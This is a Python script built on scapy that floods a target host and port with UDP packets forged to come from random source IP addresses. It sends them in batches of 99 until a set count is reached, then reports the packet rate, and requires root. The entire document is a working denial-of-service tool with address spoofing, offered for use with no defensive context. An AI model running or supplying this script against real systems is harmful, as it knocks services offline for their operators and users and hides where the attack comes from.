#!/usr/bin/env python
"""
Spam target with spoofed UDP packets from random source IP addresses
"""
import sys
import os
import random
import argparse
import datetime
from Queue import Queue
from scapy.all import IP,UDP,send

def is_root():
    """Return true if script is run as root"""
    if not os.geteuid() == 0:
        return False
    return True

def randomoctet():
    return random.choice(range(1,254))

def randomip():
    ip="{}.{}.{}.{}".format(randomoctet(),randomoctet(),randomoctet(),randomoctet())
    return ip

def main(target, port, packetcounter, count):
    print "Sending {} packets to target: {}:{}".format(count, target, port)
    while True:
        packets = []
        src=randomip()
        # send packets in 100 packet batches
        for i in range(1,100):
            if packetcounter.qsize() >= count:
                print "Packet count reached"
                return
            sport=int("{}".format(i))
            packets.append(IP(ttl=5,src=src,dst=target)/UDP(sport=sport,dport=port))
            print "Source {}:{} -> dst: {}:{}".format(src,sport,target,port)
            packetcounter.put(i)
        send(packets)

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("-p", type=int, default=80, help="Target port. Default port is 80")
    parser.add_argument("-c", default=100, type=int, help="Request count")
    args = parser.parse_args()
    return args

if __name__ == "__main__":
    if not is_root():
        print "This script requires root privileges!"
        sys.exit(1)
    args = parse_args()
    start_time = datetime.datetime.now()
    packetcounter=Queue()
    target = args.target
    count = args.c
    port = args.p
    try:
        main(target, port, packetcounter, count)
    except KeyboardInterrupt:
        print "Ctrl-c pressed"
    packets_sent= packetcounter.qsize()
    running_time_delta = datetime.datetime.now() - start_time
    running_time = running_time_delta.total_seconds()
    rate = packets_sent / running_time
    print "Ctrl-c"
    print "Ran for {} seconds".format(running_time)
    print "Sent {} packets".format(packets_sent)
    print "Rate: {} packets/s".format(rate)
